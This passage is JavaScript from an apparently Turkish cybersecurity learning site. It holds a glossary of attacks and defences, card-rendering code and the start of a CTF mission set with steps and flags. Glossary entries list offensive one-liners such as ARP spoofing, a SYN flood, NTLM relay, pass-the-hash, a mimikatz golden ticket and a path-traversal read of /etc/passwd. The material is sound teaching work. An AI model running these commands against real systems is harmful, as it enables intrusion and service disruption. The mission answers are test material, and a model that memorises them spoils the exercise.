        "desc": "Aynı yerel ağdaki (LAN) bilgisayarlara sahte ARP yanıtları göndererek kendini modem (Router / Gateway) gibi tanıtıp tüm ağ trafiğini kendi üzerinden geçirme saldırısıdır.",
        "analogy": "Sınıfta öğretmenin 'Müdür kim?' sorusuna arka sıradaki afacan öğrencinin ayağa kalkıp 'Benim!' diyerek tüm evrakları kendi masasına yönlendirmesi gibidir.",
        "mitigates": "Dynamic ARP Inspection (DAI), Statik ARP Tabloları, 802.1X Port Güvenliği",
        "cmd": "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1"
},
        {
        "tag": "BGP-HIJACK",
        "title": "BGP Hijacking (Küresel İnternet Rota Gaspı)",
        "category": "network",
        "desc": "İnternet servis sağlayıcıları arasındaki Border Gateway Protocol anonslarını sahte rotalarla yanıltarak tüm dünya internet trafiğini veya belirli bir IP bloğunu başka bir ülkeye saptırma saldırısıdır.",
        "analogy": "Otoyoldaki 'Ankara' tabelasını gizlice söküp 'Çıkmaz Sokak' yönüne çevirerek tüm arabaları kendi benzinliğine mecbur bırakmak gibidir.",
        "mitigates": "RPKI (Resource Public Key Infrastructure) Doğrulaması, ROA İmzaları"
},
        {
        "tag": "DDOS-SYN",
        "title": "SYN Flood & Distributed Denial of Service (DDoS)",
        "category": "network",
        "desc": "Milyonlarca zombi bilgisayardan (Botnet) aynı anda hedefe eksik TCP el sıkışma paketleri (SYN) yağdırarak sunucunun bağlantı tablosunu tüketip çökertme saldırısıdır.",
        "analogy": "Bir kafeye aynı anda 1000 kişinin girip 'Bir çay ver' demesi ama parayı ödemeden kapıda dikilerek gerçek müşterilerin içeri girmesine engel olması gibidir.",
        "mitigates": "SYN Cookies, Anycast DNS Yönlendirmesi, Cloudflare / Akamai DDoS Koruması",
        "cmd": "hping3 -S -p 80 --flood 10.0.0.1"
},
        {
        "tag": "SYN-SCAN",
        "title": "SYN Stealth Scan (-sS Gizli Port Taraması)",
        "category": "network",
        "desc": "TCP 3 yönlü el sıkışmasını tamamlamadan (SYN gönderip SYN-ACK aldıktan sonra RST atarak) portun açık olup olmadığını anlayan ve eski sistem loglarında iz bırakmayan taramadır.",
        "analogy": "Bir evin kapısını çalıp içeriden 'Kim o?' sesini duyar duymaz kapı açılmadan arkasını dönüp kaçmak gibidir. Evde birinin olduğunu anlarsınız ama içeri girmezsiniz.",
        "mitigates": "Stateful Firewall Kuralı, Snort/Suricata Port Tarama İmzaları",
        "cmd": "nmap -sS -Pn 192.168.1.50"
},
        {
        "tag": "CIDR-SUBNET",
        "title": "Subnetting & CIDR (Alt Ağ Maskeleme: /24, /16)",
        "category": "network",
        "desc": "Büyük bir IP havuzunu mantıksal küçük güvenlik bölgelerine ayırma yöntemidir. Örneğin /24 notasyonu ilk 24 bitin ağ adresi, son 8 bitin (254 host) cihaz adresi olduğunu belirtir.",
        "analogy": "Büyük bir şirketin genel binasını Muhasebe, İK ve Yazılım diye ayrı katlara bölüp kapılarına güvenlik kilidi takmak gibidir.",
        "mitigates": "Geniş Yayın (Broadcast) Fırtınaları, Kontrolsüz Yatay Ağ Geçişi (Lateral Movement)",
        "cmd": "ipcalc 192.168.1.0/24"
},
        {
        "tag": "VLAN",
        "title": "Virtual Local Area Network (Sanal Ağ İzolasyonu)",
        "category": "network",
        "desc": "Aynı fiziksel ağ anahtarı (Switch) üzerindeki portları yazılımsal olarak birbirinden tamamen bağımsız ve birbirini göremeyen sanal ağlara (VLAN 10, VLAN 20) ayırma teknolojisidir.",
        "analogy": "Aynı apartmanda yan yana oturan komşuların birbirinin dairesine kapıdan geçememesi, yalnızca ortak binada bulunmaları gibidir.",
        "mitigates": "Ağ Dinleme (Sniffing), Yetkisiz Dahili Ağ Sızmaları"
},
        {
        "tag": "TOR-ROUTING",
        "title": "Onion Routing (Soğan Yönlendirme & Anonimlik)",
        "category": "network",
        "desc": "Veriyi kat kat şifreleyerek dünya çapındaki gönüllü aktarıcılar (Entry, Middle, Exit Node) üzerinden sektiren; ne kaynak ne hedef sunucunun kimliği tek başına bilemediği anonim ağdır.",
        "analogy": "Mektubu iç içe 3 farklı kilitli zarfa koyup 3 farklı kuryeye teslim etmek gibidir. Hiçbir kurye mektubun asıl sahibini ve son varış noktasını aynı anda bilmez.",
        "mitigates": "Coğrafi IP Takibi, Sansür ve Trafik Analizi"
},
        {
        "tag": "SMB-RELAY",
        "title": "SMB Relay & NTLM NetNTLMv2 Aktarım Saldırısı",
        "category": "attacks",
        "desc": "Ağdaki bir kullanıcının SMB üzerinden gönderdiği NTLM kimlik doğrulama isteğini yakalayıp şifresini kırmadan doğrudan ağdaki başka bir sunucuya ileterek oturum açma saldırısıdır.",
        "analogy": "Bir kişinin başkasının kimlik kartını alıp fotoğrafına bakmadan güvenlik görevlisine 'Ben buyum' diyerek içeri sızması gibidir.",
        "mitigates": "SMB Signing Zorunluluğu, NTLMv1 Devre Dışı Bırakılması",
        "cmd": "ntlmrelayx.py -tf targets.txt -smb2support"
},
        {
        "tag": "PASS-THE-HASH",
        "title": "Pass-the-Hash (Parolayı Kırmadan Hash ile Giriş)",
        "category": "attacks",
        "desc": "Windows işletim sisteminde kurbanın açık metin şifresini bilmeye gerek kalmadan, ele geçirilen NTLM hash'ini doğrudan kimlik doğrulama paketine enjekte ederek sisteme sızma tekniğidir.",
        "analogy": "Kasanın anahtarının şifresini bilmek yerine anahtarın bal mumu kalıbını alıp kilide sokarak kapıyı açmak gibidir.",
        "mitigates": "LSA Protection, Credential Guard, Domain Protected Users Grubu",
        "cmd": "psexec.py -hashes :aad3b... admin@10.0.0.5"
},
        {
        "tag": "GOLDEN-TICKET",
        "title": "Kerberos Golden Ticket (Active Directory Mutlak Hükümdarlık)",
        "category": "attacks",
        "desc": "Active Directory'deki KRBTGT hesabının hash'i ele geçirildiğinde, saldırganın istediği kullanıcı adına (hatta sahte kullanıcılara) 10 yıllık sınırsız TGT bileti üreterek ormandaki her makineyi ele geçirmesidir.",
        "analogy": "Devletin darphanesindeki mühür ve kaşe makinesini çalıp kendi adına sınırsız geçerli sahte diplomatik pasaport basmak gibidir.",
        "mitigates": "KRBTGT Parolasının Yılda 2 Kez Düzenli Sıfırlanması, Tiering Mimarisi",
        "cmd": "mimikatz \"kerberos::golden /user:Administrator /domain:corp.local ...\""
},
        {
        "tag": "LFI-RFI",
        "title": "Local File Inclusion & Path Traversal (../../etc/passwd)",
        "category": "attacks",
        "desc": "Web uygulamasının kullanıcıdan aldığı dosya parametresini denetlemeden include etmesi sonucu, saldırganın `../../` karakterleriyle sistemin hassas dosyalarını (/etc/passwd, web.config) okuması veya kod çalıştırmasıdır.",
        "analogy": "Bir kütüphaneciye 'Bana 3. raftaki kitabı getir' demek yerine 'Bana kütüphanenin arka odasındaki gizli kasa defterini getir' deyip kütüphanecinin bunu sorgulamadan getirmesidir.",
        "mitigates": "Girdi Doğrulama (Whitelist), open_basedir Kısıtlaması, Doğrudan Dosya Yolu Kabul Etmeme",
        "cmd": "curl http://target.local/view.php?file=../../../../etc/passwd"
},
        {
        "tag": "RCE",
        "title": "Remote Code Execution (Uzaktan Kod ve Komut Çalıştırma)",
        "category": "attacks",
        "desc": "Saldırganın hedef sunucuda istediği herhangi bir işletim sistemi komutunu (bash/cmd) uzaktan çalıştırabilmesini sağlayan, en yüksek kritiklik seviyesine (CVSS 10.0) sahip zafiyet türüdür.",
        "analogy": "Bir evin kapı zilindeki konuşma butonundan evin içine seslenirken 'Mutfaktaki gazı aç ve kibriti yak' dediğinizde evin içindeki akıllı sistemin bunu yapması gibidir.",
        "mitigates": "exec() / system() / eval() Fonksiyonlarının Yasaklanması, Katı Parametrizasyon, Sandboxing"
},
        {
        "tag": "BUFFER-OVERFLOW",
        "title": "Buffer Overflow (Bellek Taşması & EIP Kontrolü)",
        "category": "attacks",
        "desc": "C/C++ gibi dillerde ayrılan bellek alanından daha fazla veri yazılarak bitişik bellek hücrelerinin (Instruction Pointer - EIP/RIP) ezilmesi ve işlemcinin saldırganın zararlı koduna yönlendirilmesidir.",
        "analogy": "1 litrelik bir sürahiye 5 litre su dökmek gibidir; taşan su masadaki diğer önemli evrakların ve elektrik prizinin üzerine akarak sistemi bozar.",
        "mitigates": "ASLR (Address Space Layout Randomization), DEP / NX Biti, Stack Canaries"
},
        {
        "tag": "BURP-SUITE",
        "title": "Burp Suite (Web Güvenliği ve İstismar Proxy Laboratuvarı)",
        "category": "tools",
        "desc": "Tarayıcı ile web sunucusu arasına oturarak giden ve gelen tüm HTTP paketlerini yakalayan, parametreleri değiştiren, otomatik zafiyet tarayan siber güvenlik uzmanlarının bir numaralı web aracıdır.",
        "analogy": "Mektubu postacıya vermeden önce açıp içindeki kelimeleri silip yerine başka şeyler yazmanızı sağlayan profesyonel bir büyüteçli yazı masası gibidir.",
        "mitigates": "Web Uygulama Güvenlik Testleri, Manuel Pentest Validasyonu"
},
        {
        "tag": "METASPLOIT",
        "title": "Metasploit Framework (Otomatize Exploit Geliştirme Motoru)",
        "category": "tools",
        "desc": "Binlerce doğrulanmış zafiyet sömürü kodunu (Exploit), zararlı yükü (Payload) ve dinleyiciyi (Handler) tek bir konsol altında toplayan dünyanın en popüler sızma testi çerçevesidir.",
        "analogy": "İsviçre çakısının bin kat büyüğü; içinde her türlü kapıyı açacak özel maymuncuk ve aletlerin düzenli çekmecelerde dizildiği bir istismar dolabıdır.",
        "mitigates": "Sistem Yamalama, Düzenli Güvenlik Taramaları",
        "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ...'"
},
        {
        "tag": "JOHN-RIPPER",
        "title": "John the Ripper (Çevrimdışı Kriptografik Hash Kırıcı)",
        "category": "tools",
        "desc": "Ele geçirilen şifreli hash dosyalarını (MD5, SHA-256, NTLM, Unix crypt) sözlük ve kaba kuvvet yöntemleriyle kendi işlemcinizde kırarak açık metin şifreyi bulan araçtır.",
        "analogy": "Yerde bulduğunuz bir kilitli günlüğü evinize götürüp oturup günlerce farklı kombinasyonlar deneyerek kilidi sessizce açmaya çalışmaktır.",
        "mitigates": "Argon2 / BCrypt Gibi Yavaşlatılmış ve Tuzlanmış Güçlü Algoritmalar",
        "cmd": "john --wordlist=rockyou.txt hashes.txt"
},
        {
        "tag": "AIRCRACK",
        "title": "Aircrack-ng (Wi-Fi Kablosuz Ağ Güvenlik Paketi)",
        "category": "tools",
        "desc": "Kablosuz ağ kartlarını monitör moduna alarak havadaki 802.11 WPA/WPA2 4 yönlü el sıkışma paketlerini yakalayan ve sözlük saldırısıyla Wi-Fi şifresini kıran araç takımıdır.",
        "analogy": "Havada uçuşan radyo dalgalarını özel bir antenle dinleyip iki kişinin fısıldaşırken söylediği gizli parolayı kaydetmek gibidir.",
        "mitigates": "WPA3 Şifreleme, 802.1X Enterprise Doğrulaması, Karmaşık 16+ Parolalar",
        "cmd": "aircrack-ng -w wordlist.txt capture.cap"
},
        {
        "tag": "TCPDUMP-CMD",
        "title": "tcpdump CLI (Komut Satırı Ağ Paketi Röntgeni)",
        "category": "tools",
        "desc": "Grafik arayüzü olmayan sunucularda ağ kartından geçen ham paketleri filtreleyerek analiz etmeyi ve PCAP dosyası olarak kaydetmeyi sağlayan temel ağ dinleme komutudur.",
        "analogy": "Su borusuna şeffaf bir cam takıp içinden geçen her damla suyun rengini ve hızını saymak gibidir.",
        "mitigates": "Şifresiz Protokollerin Tespiti, Ağ Anomalisi Avcılığı",
        "cmd": "tcpdump -i any -nn -s0 -w traffic.pcap"
},
        {
        "tag": "SOC",
        "title": "Security Operations Center (Siber Güvenlik Operasyon Merkezi)",
        "category": "defense",
        "desc": "Kurumun dijital varlıklarını 7/24 kesintisiz izleyen, gelen tehdit alarmlarını filtreleyen, analiz eden ve olaylara ilk müdahaleyi gerçekleştiren uzman ekibin çalıştığı komuta merkezidir.",
        "analogy": "Bir hastanenin acil servis odası gibidir; 24 saat nöbettedirler, ambulans (alarm) geldiğinde hastaya anında müdahale ederler.",
        "mitigates": "Fark Edilmeyen Sızıntılar, Geciken Tehdit Müdahaleleri"
},
        {
        "tag": "CERT-CSIRT",
        "title": "CERT / CSIRT (Siber Olaylara Müdahale Ekibi)",
        "category": "defense",
        "desc": "Büyük bir siber saldırı veya veri ihlali meydana geldiğinde sahaya inen, yangını söndüren, zararlı yazılımı temizleyen ve sistemleri ayağa kaldıran özel harekat siber ekibidir.",
        "analogy": "Yangın çıktığında binaya giren itfaiye ve olay yeri inceleme ekibidir; hem yangını söndürürler hem de yangının nereden başladığını araştırırlar.",
        "mitigates": "Kriz Anında Veri Kaybı, Sistem Çöküşleri, İtibar Kaybı"
},
        {
        "tag": "ASLR-DEP",
        "title": "ASLR & DEP / NX (İşletim Sistemi Bellek Savunma Zırhları)",
        "category": "defense",
        "desc": "ASLR proses belleğindeki fonksiyon adreslerini her çalıştırmada rastgele karıştırır; DEP (Data Execution Prevention) ise veri alanlarında kod çalıştırılmasını engelleyerek bellek istismarlarını felç eder.",
        "analogy": "Bir labirentin tüm odalarının yerini ve kapı numaralarını her 5 dakikada bir otomatik değiştirmek; saldırgan labirenti ezberlese bile içeri girdiğinde kaybolur.",
        "mitigates": "Buffer Overflow, Return-Oriented Programming (ROP), Shellcode Enjeksiyonu"
},
{
        "tag": "TYPOSQUATTING",
        "title": "Typosquatting & URL Hijacking (Yazım Hatası Pusu Saldırısı)",
        "category": "attacks",
        "desc": "Kullanıcıların popüler web adreslerini (örneğin google yerine gogle) yanlış yazmasını fırsat bilip sahte etki alanları kaydederek kurbanı zararlı yazılıma veya oltalamaya çekme tekniğidir.",
        "analogy": "Meşhur bir kebapçının hemen yanına tabeladaki bir harfi değiştirip aynı renkte sahte dükkan açarak müşterileri yanıltmak gibidir.",
        "mitigates": "Benzer Domainlerin Önceden Kurum Tarafından Satın Alınması, DNS Filtreleme"
},
        {
        "tag": "DNS-POISONING",
        "title": "DNS Cache Poisoning / Spoofing (DNS Önbellek Zehirleme)",
        "category": "network",
        "desc": "DNS sunucularının önbelleğine sahte IP adresleri enjekte ederek kullanıcılar banka veya şirket adresini yazdığında onları gizlice saldırganın sahte sunucusuna yönlendirmektir.",
        "analogy": "Postanenin telefon fihristindeki doktorun telefon numarasını silip yerine bir hırsızın numarasını yazmak gibidir; arayan herkes hırsıza bağlanır.",
        "mitigates": "DNSSEC (Domain Name System Security Extensions) İmzaları, Rastgele Kaynak Portu (Kaminisky Yaması)"
},
        {
        "tag": "SUPPLY-CHAIN",
        "title": "Supply Chain Attack (Tedarik Zinciri Siber Saldırısı)",
        "category": "attacks",
        "desc": "Hedef şirkete doğrudan sızmak yerine, şirketin kullandığı güvenilir bir üçüncü parti yazılım kütüphanesini (npm, PyPI) veya güncelleme sunucusunu (SolarWinds) hackleyip zararlı kodu oradan yaymaktır.",
        "analogy": "Kralın sarayına doğrudan saldıramayan bir casusun, saraya her sabah taze ekmek getiren fırıncının ununa zehir karıştırması gibidir.",
        "mitigates": "Yazılım Malzeme Listesi (SBOM), Bağımlılık İmzalaması, Güvenli Kaynak Denetimi"
},
        {
        "tag": "CONTAINER-ESCAPE",
        "title": "Docker & Container Escape (Konteyner İzolasyonunu Kırma)",
        "category": "attacks",
        "desc": "Docker veya Kubernetes konteyneri içine sızan bir saldırganın, zafiyetli Linux cgroups/namespaces veya yetkili bayraklar (--privileged) üzerinden ana fiziksel sunucuya (Host) atlamasıdır.",
        "analogy": "Hapishane hücresindeki mahkumun havalandırma borusunu söküp doğrudan gardiyanın ana nöbet odasına tırmanması gibidir.",
        "mitigates": "Root Olmayan Konteyner Kullanımı (Non-Root User), AppArmor, seccomp Profilleri",
        "cmd": "docker run --rm -it --privileged alpine sh"
},
        {
        "tag": "SHODAN",
        "title": "Shodan (İnternete Bağlı Cihazların Arama Motoru)",
        "category": "tools",
        "desc": "Google web sayfalarını tararken, Shodan dünyadaki tüm internete açık IP'leri tarayarak güvenlik kameraları, endüstriyel SCADA vanaları, sunucular ve açık portları haritalar.",
        "analogy": "Şehirdeki tüm evlerin kapı zillerini tek tek çalıp 'İçeride kim var, kapı kilitli mi?' diye not tutan devasa bir şehir gözlemcisidir.",
        "mitigates": "Açık Yönetim Portlarının İnternetten Kapatılması, VPN Zorunluluğu",
        "cmd": "shodan host 8.8.8.8"
},
        {
        "tag": "K8S-RBAC",
        "title": "Kubernetes RBAC & Cluster Security (K8s Küme Güvenliği)",
        "category": "defense",
        "desc": "Mikroservis mimarilerinde pod'ların, servis hesaplarının ve kullanıcıların sadece kendilerine tahsis edilen namespace ve API endpoint'lerine erişebilmesini sağlayan rol bazlı kurallar bütünüdür.",
        "analogy": "Havalimanındaki temizlik personeli kartının sadece bekleme salonuna açılması, pilot kartının ise sadece kokpite açılması gibi sıkı bir kartlı geçiş hiyerarşisidir.",
        "mitigates": "Konteynerler Arası Yatay Sızma, Küme Seviyesinde Yetki Yükseltme",
        "cmd": "kubectl auth can-i create pods --as=developer"
},
        {
        "tag": "PADDING-ORACLE",
        "title": "Padding Oracle Attack (Blok Şifreleme Dolgu Saldırısı)",
        "category": "attacks",
        "desc": "CBC modunda şifrelenmiş verileri çözerken sunucunun verdiği dolgu (padding) hata mesajlarını analiz ederek, gizli anahtara sahip olmadan şifreli metnin bayt bayt açık halini ele geçirme tekniğidir.",
        "analogy": "Kombinasyonlu kasanın çarkını çevirirken kulağınızı kasaya dayayıp doğru sayıya her bastığınızda kasanın içinden gelen küçük 'klik' sesini dinleyerek şifreyi çözmektir.",
        "mitigates": "GCM (Galois/Counter Mode) Gibi Doğrulanmış Şifreleme (AEAD) Kullanımı"
},
        {
        "tag": "STUXNET",
        "title": "Stuxnet & SCADA / ICS Siber Fiziksel Silahları",
        "category": "attacks",
        "desc": "İran nükleer santrallerindeki uranyum zenginleştirme santrifüjlerinin motor hızlarını değiştirerek fiziksel olarak parçalanmalarını sağlayan dünyanın ilk siber-fiziksel silahıdır.",
        "analogy": "Fabrikanın kazan dairesindeki sıcaklık göstergesini normal gösterirken arkadan vanayı sonuna kadar açarak kazanı patlatan görünmez hayalet casus gibidir.",
        "mitigates": "Hava Boşluğu (Air-Gap), PLC Yazılım Bütünlük Doğrulaması, SCADA İzolasyonu"
},
];
    window.glossaryData = glossaryData;


    function bindGlossary() {
        const input = document.getElementById('glossary-search-input');
        const pillContainer = document.getElementById('glossary-category-pills');
        const container = document.getElementById('glossary-cards-container');
        const badgeCount = document.getElementById('glossary-badge-count');

        let activeCat = 'all';

        if (badgeCount) {
            badgeCount.textContent = `${glossaryData.length}+ KAPSAMLI SİBER TERİM & ANALOJİ`;
        }
        if (pillContainer) {
            const allPill = pillContainer.querySelector('.filter-pill[data-cat="all"]');
            if (allPill) allPill.textContent = `Tümü (${glossaryData.length}+)`;
        }

        function applyFilter() {
            const query = input ? input.value : '';
            renderGlossary(activeCat, query);
        }

        if (input) input.addEventListener('input', applyFilter);

        // Fixed pill click listener with delegation
        if (pillContainer) {
            pillContainer.addEventListener('click', (e) => {
                const pill = e.target.closest('.filter-pill');
                if (!pill) return;
                pillContainer.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
                pill.classList.add('active');
                activeCat = pill.dataset.cat || 'all';
                applyFilter();
            });
        }

        // Delegated click handler for copy/run buttons inside glossary cards
        if (container) {
            container.addEventListener('click', (e) => {
                const copyBtn = e.target.closest('.btn-cmd-copy');
                if (copyBtn) {
                    e.stopPropagation();
                    const text = copyBtn.dataset.copy || '';
                    if (!text) return;
                    navigator.clipboard.writeText(text).then(() => {
                        const orig = copyBtn.textContent;
                        copyBtn.textContent = '✔ Kopyalandı!';
                        copyBtn.style.color = 'var(--green)';
                        showToast('success', 'Komut Kopyalandı', `"${text}" panoya kopyalandı.`);
                        setTimeout(() => {
                            copyBtn.textContent = orig;
                            copyBtn.style.color = '';
                        }, 1800);
                    });
                    return;
                }

                const runBtn = e.target.closest('.btn-cmd-run');
                if (runBtn) {
                    e.stopPropagation();
                    const cmd = runBtn.dataset.run || '';
                    if (!cmd) return;
                    if (typeof window.runKaliCommand === 'function') {
                        window.runKaliCommand(cmd);
                        showToast('info', 'Kali Terminali Devrede', `"${cmd}" terminalde çalıştırıldı.`);
                    }
                }
            });
        }

        // Initial render
        renderGlossary('all', '');
    }

    function renderGlossary(category, query) {
        const container = document.getElementById('glossary-cards-container');
        if (!container) return;

        const catMeta = {
            auth: { label: 'Kimlik & Oturum', icon: '🔐' },
            network: { label: 'Ağ & Protokol', icon: '🌐' },
            attacks: { label: 'Saldırı Türü', icon: '⚔️' },
            defense: { label: 'Savunma & Kripto', icon: '🛡️' },
            tools: { label: 'Siber Araç (Kali)', icon: '💻' }
        };

        function renderMitigationPills(mitigatesStr) {
            if (!mitigatesStr) return '';
            return mitigatesStr
                .split(',')
                .map(s => s.trim())
                .filter(Boolean)
                .map(pill => `<span class="mitigation-tag-pill">${escapeHtml(pill)}</span>`)
                .join('');
        }

        const q = (query || '').toLowerCase().trim();
        const filtered = glossaryData.filter(item => {
            const matchesCat = category === 'all' || item.category === category;
            const matchesQuery = !q ||
                item.tag.toLowerCase().includes(q) ||
                item.title.toLowerCase().includes(q) ||
                item.desc.toLowerCase().includes(q) ||
                item.analogy.toLowerCase().includes(q) ||
                (item.cmd && item.cmd.toLowerCase().includes(q));
            return matchesCat && matchesQuery;
        });

        if (filtered.length === 0) {
            container.innerHTML = `
                <div style="grid-column: 1/-1; text-align: center; padding: 48px; background: var(--bg-card); border-radius: var(--radius-lg); border: 1px solid var(--border);">
                    <p style="color: var(--text-muted); font-size: 14px;">"${escapeHtml(query)}" terimi bulunamadı.</p>
                </div>
            `;
            return;
        }

        container.innerHTML = filtered.map(item => {
            const meta = catMeta[item.category] || { label: item.category.toUpperCase(), icon: '🛡️' };
            return `
                <div class="glossary-card cat-${escapeHtml(item.category)}" data-reveal>
                    <div class="glossary-card-header">
                        <div class="glossary-badges-row">
                            <span class="glossary-tag-badge">${escapeHtml(item.tag)}</span>
                            <span class="glossary-cat-badge cat-${escapeHtml(item.category)}">
                                ${meta.icon} ${escapeHtml(meta.label)}
                            </span>
                        </div>
                        <span class="glossary-watermark">A-Z</span>
                    </div>

                    <h3 class="glossary-title">${escapeHtml(item.title)}</h3>
                    
                    <p class="glossary-desc">${escapeHtml(item.desc)}</p>

                    <!-- Analogy Callout Box -->
                    <div class="glossary-analogy-box">
                        <div class="glossary-analogy-header">
                            <span class="analogy-icon">💡</span>
                            <span class="analogy-heading">GÜNLÜK HAYATTAN BENZETME</span>
                        </div>
                        <p class="glossary-analogy-quote">“${escapeHtml(item.analogy)}”</p>
                    </div>

                    <!-- Mitigations Tag Row -->
                    <div class="glossary-mitigations-box">
                        <div class="mitigation-header">
                            <span class="mitigation-icon">🛡️</span>
                            <span>KORUDUĞU TEHDİTLER:</span>
                        </div>
                        <div class="mitigation-pills-row">
                            ${renderMitigationPills(item.mitigates)}
                        </div>
                    </div>

                    ${item.cmd ? `
                        <div class="glossary-cli-box">
                            <div class="glossary-cli-header">
                                <span>⚡ İLGİLİ KALİ / GÜVENLİK KOMUTU:</span>
                                <div class="cmd-actions">
                                    <button type="button" class="btn-cmd-copy" data-copy="${escapeHtml(item.cmd)}">📋 Kopyala</button>
                                    <button type="button" class="btn-cmd-run" data-run="${escapeHtml(item.cmd)}">⚡ Çalıştır</button>
                                </div>
                            </div>
                            <div class="glossary-cli-code">
                                <span class="prompt-sign">$</span>
                                <code>${escapeHtml(item.cmd)}</code>
                            </div>
                        </div>
                    ` : ''}
                </div>
                `;
        }).join('');
    }

    // ==========================================

    // ==========================================
    // SİBER CTF ARENASI (6 KADEMELİ OPERASYON MOTORU)
    // ==========================================
    const CTF_MISSIONS = [
        {
            id: 'm1_1',
            level: '1.1',
            levelTier: 1,
            group: 'recon',
            levelLabel: 'SEVİYE 1.1 // AĞ KEŞFİ & PORT TARAMA',
            levelLabel_en: 'LEVEL 1.1 // NETWORK RECON & PORT SCAN',
            badgeColor: '#38bdf8',
            title: 'Operasyon Kapı Çalan (Op: Door Knocker)',
            title_en: 'Operation Door Knocker (Network Recon)',
            target: '10.10.1.5 (Dış Ağ Geçidi)',
            target_en: '10.10.1.5 (External Gateway)',
            category: 'Ağ Keşfi (Reconnaissance)',
            category_en: 'Network Reconnaissance',
            xp: 100,
            story: 'İstihbarat birimi, dış ağda şüpheli bir sınır sunucusu (<code>10.10.1.5</code>) tespit etti. Sunucunun ayakta olup olmadığını kontrol et, açık portları ve servis versiyonlarını tara, ardından HTTP sunucusunun yanıt başlıklarına (headers) gizlenmiş Base64 şifreli mesajı çözerek ilk bayrağı ele geçir.',
            story_en: 'Intelligence detected a suspicious perimeter server (<code>10.10.1.5</code>). Verify host availability, scan open ports and service versions, inspect HTTP response headers to find the hidden Base64 token, and decode it to capture your first flag.',
            tools: ['ping', 'nmap', 'curl', 'base64'],
            steps: [
                { label: 'Hedef sunucunun aktifliğini doğrula (ICMP Ping)', label_en: 'Verify target host availability (ICMP Ping)', cmd: 'ping -c 3 10.10.1.5', match: ['ping', '10.10.1.5'] },
                { label: 'Açık portları ve servis versiyonlarını tara', label_en: 'Scan open ports and service versions', cmd: 'nmap -sV 10.10.1.5', match: ['nmap', '10.10.1.5'] },
                { label: 'HTTP yanıt başlıklarını (Headers) incele', label_en: 'Inspect HTTP response headers', cmd: 'curl -I http://10.10.1.5', match: ['curl', '10.10.1.5'] },
                { label: 'X-Secret-Auth başlığındaki Base64 şifreyi çöz', label_en: 'Decode the Base64 token in X-Secret-Auth', cmd: 'echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d', match: ['base64'] }
            ],
            quickCmds: [
                'ping -c 3 10.10.1.5',
                'nmap -sV 10.10.1.5',
                'curl -I http://10.10.1.5',
                'echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d'
            ],
            hint: '1) <code>ping -c 3 10.10.1.5</code> ile bağlantıyı doğrula.<br>2) <code>nmap -sV 10.10.1.5</code> ile Port 80 HTTP servisini gör.<br>3) <code>curl -I http://10.10.1.5</code> yazarak <code>X-Secret-Auth</code> başlığındaki Base64 kodu bul.<br>4) <code>echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d</code> komutuyla bayrağı çöz!',
            flag: 'LFL{level1_1_ag_kesif_basarans}',
            successMsg: 'Harika! Ağ keşfi, port taraması ve Base64 kod çözme adımlarını tamamlayarak Seviye 1.2 kilidini açtın!'
        },
        {
            id: 'm1_2',
            level: '1.2',
            levelTier: 1,
            group: 'recon',
            levelLabel: 'SEVİYE 1.2 // LINUX DOSYA & LOG ANALİZİ',
            levelLabel_en: 'LEVEL 1.2 // LINUX FILESYSTEM & LOG ANALYSIS',
            badgeColor: '#00e5ff',
            title: 'Operasyon Hayalet Not (Op: Ghost Note)',
            title_en: 'Operation Ghost Note (Linux Log Audit)',
            target: '/var/backups & /var/log/syslog',
            target_en: '/var/backups & /var/log/syslog',
            category: 'Linux Sistem & Log Keşfi',
            category_en: 'Linux System & Log Audit',
            xp: 150,
            story: 'Sınır sunucusuna düşük yetkili erişim sağlandı. İçerideki bir sistem yöneticisi yedekleme dizinine (<code>/var/backups</code>) gizli bir not bıraktı. Gizli dosyaları listele, notu oku ve sistem günlüklerinde (<code>/var/log/syslog</code>) sızdırılan anahtarı <code>grep</code> ile filtrele.',
            story_en: 'Low-privilege access obtained on the perimeter box. A sysadmin left a hidden note inside <code>/var/backups</code>. List hidden files, read the note, and filter <code>/var/log/syslog</code> with <code>grep</code> to extract the leaked flag.',
            tools: ['ls', 'cat', 'grep'],
            steps: [
                { label: '/var/backups dizinindeki gizli yedekleri listele', label_en: 'List hidden backup files in /var/backups', cmd: 'ls -la /var/backups', match: ['ls', '/var/backups'] },
                { label: 'Operatörün bıraktığı gizli notu oku', label_en: 'Read the secret operator note', cmd: 'cat /var/backups/operator_note.txt', match: ['cat', 'operator_note.txt'] },
                { label: 'Sistem loglarından (syslog) LFL{ bayrağını süz', label_en: 'Filter LFL{ flag from /var/log/syslog', cmd: 'grep -i "LFL{" /var/log/syslog', match: ['grep', 'syslog'] }
            ],
            quickCmds: [
                'ls -la /var/backups',
                'cat /var/backups/operator_note.txt',
                'grep -i "LFL{" /var/log/syslog'
            ],
            hint: '1) <code>ls -la /var/backups</code> ile gizli yedek dosyalarını gör.<br>2) <code>cat /var/backups/operator_note.txt</code> ile operatörün bıraktığı ipucunu oku.<br>3) <code>grep -i "LFL{" /var/log/syslog</code> komutuyla yüzlerce log satırı arasından bayrağı çek!',
            flag: 'LFL{level1_2_linux_dosya_adli_analiz}',
            successMsg: 'Mükemmel! Linux dizin keşfi ve log filtreleme görevini bitirdin. Seviye 2.1 Web Sızma Operasyonu açıldı!'
        },
        {
            id: 'm2_1',
            level: '2.1',
            levelTier: 2,
            group: 'red',
            levelLabel: 'SEVİYE 2.1 // WEB DİZİN TARAMA & KEŞİF',
            levelLabel_en: 'LEVEL 2.1 // WEB DIRECTORY FUZZING & RECON',
            badgeColor: '#22c55e',
            title: 'Operasyon Derin Dizin (Op: Deep Directory)',
            title_en: 'Operation Deep Directory (Web Fuzzing)',
            target: 'http://10.10.2.10 (İç Portal)',
            target_en: 'http://10.10.2.10 (Internal Portal)',
            category: 'Web Uygulama Güvenliği',
            category_en: 'Web Application Security',
            xp: 250,
            story: 'İç ağdaki kurumsal web portalı (<code>http://10.10.2.10</code>) dışarıdan normal bir site gibi görünüyor. Ancak geliştiriciler arama motorlarından gizledikleri bir yönetim kasasını sunucuda unutmuş. <code>gobuster</code> ile dizinleri tara, <code>robots.txt</code> ve gizli yapılandırma dosyasını incele!',
